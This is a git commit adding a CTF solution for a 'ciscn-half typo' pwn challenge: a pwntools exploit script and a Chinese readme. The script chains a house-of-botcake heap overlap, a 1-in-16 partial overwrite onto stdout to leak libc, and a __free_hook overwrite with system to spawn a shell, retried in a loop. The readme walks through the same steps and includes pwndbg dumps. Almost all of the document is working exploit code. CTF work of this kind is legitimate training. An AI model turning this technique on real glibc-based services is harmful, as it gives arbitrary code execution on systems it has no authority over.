094724b122e0f140ef9f15f6fc29df0c31374d3b
thj <thj8@163.com>
2025-05-05 10:57:22 +0800

    ciscn-half typo

---
+++ tasks/ciscn-half/typo/exp.py
@@ -0,0 +1,111 @@
+from elftools.construct import lib
+from pwn import *
+
+context.log_level = "debug"
+context.arch = "amd64"
+context.os = "linux"
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+# context.timeout = 1
+
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path = "./pwn"
+libc_path = "./libc-2.31.so"
+
+elf, rop = ELF(vuln_path), ROP(vuln_path)
+libc, roplibc = ELF(libc_path), ROP(libc_path)
+
+def get_io():
+    if not f_remote:
+        io = process([vuln_path])
+        # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
+    else:
+        io = remote("", 9999)
+    return io
+
+def ddebug(io, b=""):
+    if not f_gdb:
+        return
+
+    gdb.attach(io, gdbscript=b)
+    pause()
+
+
+def add(io, idx, size):
+    io.sendlineafter(">> ", b"1")
+    io.sendlineafter("Index: ", str(idx))
+    io.sendlineafter("Size: ", str(size))
+
+def edit(io,idx, new_size, content):
+    io.sendlineafter(">> ", b"3")
+    io.sendlineafter("Index: ", str(idx))
+    io.sendlineafter("of content: ", new_size)
+    io.sendafter("to say: ", content)
+
+def delete(io, idx):
+    io.sendlineafter(">> ", b"2")
+    io.sendlineafter("Index: ", str(idx))
+
+def pwn():
+    io = get_io()
+    for i in range(11):
+        add(io, i, 0x80)
+    edit(io, 0, b"%136c"+p64(0x511), "tt")
+    delete(io, 1)
+
+    
+    for i in range(11, 18):
+        add(io, i, 0x80)
+
+    for i in range(18, 20): # botcake
+        add(io, i, 0x80)
+
+    for i in range(11, 18): # fill tcache
+        delete(io, i)
+    add(io, 0x20-1, 0x10) # 避免和top合并
+
+    
+    delete(io, 19)
+    delete(io, 18)
+    add(io, 11, 0x80)
+    delete(io, 9) # botcake完成
+    add(io, 12, 0x40)  
+    add(io, 13, 0x30)  #两次malloc, 让unb中的指针后移到19节点，里面有main_arena偏移
+    edit(io, 12, b"a"*0x50+p64(0x80), b"tt") # 改下一card的size
+    edit(io, 13, b"100", b"t"*0x38+b"\x98\xb6") #最后2为改为“0xb690”,1/16概率中stdout, 0xb6a0,因为本题前8字节为size,所以-0x8
+
+    add(io, 14, 0x80)  
+    add(io, 15, 0x80)  
+    edit(io, 15, b"128", p64(0xfbad1800) + p64(0)*3 + b"\x00")
+    libc.address = u64(io.recvuntil("\x7f", timeout=0.11)[-6:].ljust(8, b"\x00")) - 0x1ec980
+    log.success("libc:-----> " + hex(libc.address))
+    if libc.address < 0:
+        return 
+
+    _free_hook = libc.symbols.get("__free_hook", 0)
+    log.success("free_hook:-----> " + hex(_free_hook))
+    system_addr = libc.symbols.get("system", 0)
+    log.success("system:-----> "+hex(system_addr))
+    
+    edit(io, 13, b"100", b"c"*0x28+p64(0)+p64(0x91))
+    delete(io, 14)
+    edit(io, 13, b"A"*8, b"c"*0x38+p64(_free_hook-0x8))
+    add(io, 16, 0x80)
+    add(io, 17, 0x80)
+    edit(io, 17, p64(system_addr), p64(system_addr)*4)
+    # ddebug(io, "breakrva 0x16c4\ncontinue")
+    edit(io, 11, b"a"*0x90+b"/bin/sh\x00", b"a"*0x80)
+
+    delete(io, 12)
+    io.interactive()
+    
+
+# pwn()
+for i in range(30):
+    try:
+        log.success(f"==========={i}============")
+        pwn()
+        time.sleep(0.5)
+    except:
+        pass
---
+++ tasks/ciscn-half/typo/readme.md
@@ -0,0 +1,89 @@
+
+# 思路
+- 构造unsortedbin 和 tcache重叠
+- 打house_of_botcake, 把fd指向unb的0x7fxxxxxx残留
+- 改写最后几位，让其与stdout碰撞，大概1/16
+- 修改stdout内容：flg->0xfbad1800, io_read_三个指针改为0
+- 泄漏libc的相对地址，为啥泄漏出来是IO_2_1_stdin的指针呢？
+- 常规操作，改free_hook，改system，free的时候直接调用system
+
+# 知识点
+1. 看相对偏移量的内存空间值，使用`tele $rebase(0x4060)`,不需要每次都vmmap再算实际地址
+2. pwndbg小知识点
+```
+pwndbg> p stdout
+$1 = (FILE *) 0x7f19015066a0 <_IO_2_1_stdout_>
+
+pwndbg> p &main_arena
+$2 = (struct malloc_state *) 0x7f1901505b80 <main_arena>
+
+pwndbg> p _IO_2_1_stdout_
+$1 = {
+  file = {
+    _flags = -72542208,
+    _IO_read_ptr = 0x7f2bdadab723 <_IO_2_1_stdout_+131> "\n",
+    _IO_read_end = 0x7f2bdadab723 <_IO_2_1_stdout_+131> "\n",
+    _IO_read_base = 0x7f2bdadab723 <_IO_2_1_stdout_+131> "\n",
+    _IO_write_base = 0x7f2bdadab723 <_IO_2_1_stdout_+131> "\n",
+    _IO_write_ptr = 0x7f2bdadab723 <_IO_2_1_stdout_+131> "\n",
+    _IO_write_end = 0x7f2bdadab724 <_IO_2_1_stdout_+132> "",
+    _IO_buf_base = 0x7f2bdadab723 <_IO_2_1_stdout_+131> "\n",
+    _IO_buf_end = 0x7f2bdadab724 <_IO_2_1_stdout_+132> "",
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x7f2bdadaa980 <_IO_2_1_stdin_>,
+    _fileno = 1,
+    _flags2 = 0,
+    _old_offset = -1,
+    _cur_column = 0,
+    _vtable_offset = 0 '\000',
+    _shortbuf = "\n",
+    _lock = 0x7f2bdadac7e0 <_IO_stdfile_1_lock>,
+    _offset = -1,
+    _codecvt = 0x0,
+    _wide_data = 0x7f2bdadaa880 <_IO_wide_data_1>,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0,
+    _mode = -1,
+    _unused2 = '\000' <repeats 19 times>
+  },
+  vtable = 0x7f2bdada74a0 <_IO_file_jumps>
+}
+
+```
+3. 构造unsortedbin 和 tcache重叠
+
+
+![](https://r2.20161023.xyz/pic/20250502215219125.png)
+
+0x511后
+![](https://r2.20161023.xyz/pic/20250502215845308.png)
+
+![](https://r2.20161023.xyz/pic/20250502220153081.png)
+
+
+![](https://r2.20161023.xyz/pic/20250504225054525.png)
+
+![](https://r2.20161023.xyz/pic/20250504230707663.png)
+
+5. botcake
+![](https://r2.20161023.xyz/pic/20250505104852424.png)
+
+```
+add(io, 12, 0x40)  
+add(io, 13, 0x30)  #两次malloc, 让unb中的指针后移到19节点，里面有main_arena偏移
+```
+![](https://r2.20161023.xyz/pic/20250505104934870.png)
+
+4. stdout相关
+改flag，read指针
+![](https://r2.20161023.xyz/pic/20250504233149150.png)
+输出后
+![](https://r2.20161023.xyz/pic/20250504233226346.png)
+
+
+# getshell
+![](https://r2.20161023.xyz/pic/20250505101419897.png)
